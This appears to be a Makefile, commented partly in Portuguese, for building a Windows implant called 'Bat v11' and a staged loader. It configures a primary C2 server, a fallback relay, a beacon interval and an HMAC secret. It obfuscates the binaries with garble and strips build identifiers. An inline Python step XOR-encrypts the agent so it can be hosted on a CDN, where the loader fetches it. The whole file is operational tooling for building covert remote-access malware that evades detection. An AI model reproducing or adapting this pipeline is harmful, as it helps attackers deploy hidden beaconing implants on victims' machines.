# Bat v11 Windows Agent + Loader
#
# Uso:
#   make agent-windows-amd64 SERVER=... SECRET=...
#   make garble-agent-windows SERVER=... SECRET=...    (producao)
#   make garble-loader-windows KEY_HEX=... PAYLOAD_URL=...  (staged loader)
#   make encrypt-agent AGENT_BIN=... KEY_HEX=...            (encrypt payload for CDN)
#
# Variaveis:
#   SERVER      = C2 primario    (ex: cdn.example.com:443)
#   FALLBACK    = fallback relay  (ex: 1.2.3.4:9443)
#   INTERVAL    = beacon interval (default: 30s)
#   SECRET      = HMAC shared secret
#   KEY_HEX     = 512 hex chars (256 bytes XOR key) para loader
#   PAYLOAD_URL = HTTPS URL do agente cifrado no CDN
#   AGENT_BIN   = caminho do .exe plaintext para encrypt-agent
#
# Nota: sem RAWSOCK_CB / KCC_ADDR / SSH_KEY / TRIGGER (Windows sem K-series)

GO     ?= go
GARBLE ?= $(shell which garble 2>/dev/null || echo $(HOME)/go/bin/garble)
PYTHON ?= python3
VERSION := v11
OUTDIR  := ../bin

SERVER      ?=
FALLBACK    ?=
INTERVAL    ?= 30s
SECRET      ?=
KEY_HEX     ?=
PAYLOAD_URL ?=
AGENT_BIN   ?=

LDFLAGS_INNER := -s -w -buildid=
FLAGS         := -ldflags="$(LDFLAGS_INNER)" -trimpath
GARBLE_FLAGS  := -literals -tiny -seed=random

.PHONY: genconfig genconfig-loader agent-windows-amd64 garble-agent-windows \
        garble-loader-windows encrypt-agent clean

genconfig:
	@[ -n "$(SECRET)" ] || (echo "ERROR: SECRET= required" && exit 1)
	@SERVER=$(SERVER) FALLBACK=$(FALLBACK) RAWSOCK_CB= KCC_ADDR= \
	 INTERVAL=$(INTERVAL) SECRET=$(SECRET) TRIGGER=udp SSH_KEY= \
	 $(PYTHON) internal/config/gen.py > internal/config/config_gen.go
	@echo "[genconfig] config_gen.go written"

genconfig-loader:
	@[ -n "$(KEY_HEX)" ] || (echo "ERROR: KEY_HEX= required (512 hex chars)" && exit 1)
	@[ -n "$(PAYLOAD_URL)" ] || (echo "ERROR: PAYLOAD_URL= required" && exit 1)
	@KEY_HEX=$(KEY_HEX) PAYLOAD_URL=$(PAYLOAD_URL) \
	 $(PYTHON) internal/config/gen_loader.py > cmd/bat-loader/loader_config.go
	@echo "[genconfig-loader] cmd/bat-loader/loader_config.go written"

agent-windows-amd64: genconfig
	@mkdir -p $(OUTDIR)
	GOOS=windows GOARCH=amd64 $(GO) build $(FLAGS) \
		-o $(OUTDIR)/bat-agent-$(VERSION)-windows-amd64.exe ./cmd/bat-agent/
	@echo "[build] $(OUTDIR)/bat-agent-$(VERSION)-windows-amd64.exe"

garble-agent-windows: genconfig
	@mkdir -p $(OUTDIR)
	GOOS=windows GOARCH=amd64 $(GARBLE) $(GARBLE_FLAGS) build \
		-ldflags="$(LDFLAGS_INNER)" -trimpath \
		-o $(OUTDIR)/bat-agent-$(VERSION)-windows-amd64.exe ./cmd/bat-agent/
	@echo "[garble] $(OUTDIR)/bat-agent-$(VERSION)-windows-amd64.exe"

garble-loader-windows: genconfig-loader
	@mkdir -p $(OUTDIR)
	GOOS=windows GOARCH=amd64 $(GARBLE) $(GARBLE_FLAGS) build \
		-ldflags="$(LDFLAGS_INNER)" -trimpath \
		-o $(OUTDIR)/bat-loader-$(VERSION)-windows-amd64.exe ./cmd/bat-loader/
	@echo "[garble] $(OUTDIR)/bat-loader-$(VERSION)-windows-amd64.exe"

# Encrypt a plaintext agent binary for CDN hosting
# Output: <AGENT_BIN>.enc
encrypt-agent:
	@[ -n "$(KEY_HEX)" ] || (echo "ERROR: KEY_HEX= required" && exit 1)
	@[ -n "$(AGENT_BIN)" ] || (echo "ERROR: AGENT_BIN= required" && exit 1)
	@$(PYTHON) -c "\
import sys, os; \
key = bytes.fromhex('$(KEY_HEX)'); \
data = open('$(AGENT_BIN)', 'rb').read(); \
enc = bytes(b ^ key[i % 256] for i, b in enumerate(data)); \
out = '$(AGENT_BIN).enc'; \
open(out, 'wb').write(enc); \
print(f'[encrypt-agent] {out} ({len(enc)} bytes)')"

clean:
	rm -f $(OUTDIR)/bat-agent-$(VERSION)-windows-amd64.exe
	rm -f $(OUTDIR)/bat-loader-$(VERSION)-windows-amd64.exe
	rm -f internal/config/config_gen.go
